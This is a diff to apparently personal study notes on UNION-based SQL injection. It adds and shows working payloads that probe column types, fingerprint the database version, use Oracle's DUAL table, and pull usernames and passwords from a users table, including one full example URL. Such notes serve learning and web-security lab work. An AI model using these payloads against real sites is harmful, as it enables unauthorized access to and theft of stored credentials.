@@ -39,10 +39,14 @@ when the attacker uses the same communication channel to both launch the attack 
 
 - to check if data type is same, `' UNION SELECT 'a', 'a'#`
     this checks if data type of 1st column is text , and 2nd column is also text.
-    `'UNION SELECT NULL,'a',NULL --` (to check if particular column has string, if 200 success, otherwise not string) (if the string a is not there in the column content, it adds it to the column and prints it along)
+    `'UNION SELECT NULL,'a',NULL --` (to check if particular column has string, if 200 success, otherwise not string) (if the string a is not there in the column content, it adds it to the column and prints it along , if done in browser)
 
 - to find version of database,
 `' UNION SELECT @@version, NULL# `  (null is added because there are 2 column)
+
+
+- to find username and password from table users
+`'+UNION+SELECT+username,+password+FROM+users--`
 
 `www.test.com/app.php?id=' UNION SELECT username, password FROM users--`
     we didn't give id so it's empty
@@ -150,8 +154,8 @@ __information_schema.tables__
 
 
 
-
-
+- database specific syntax
+`' UNION SELECT NULL FROM DUAL--`
 
 
 
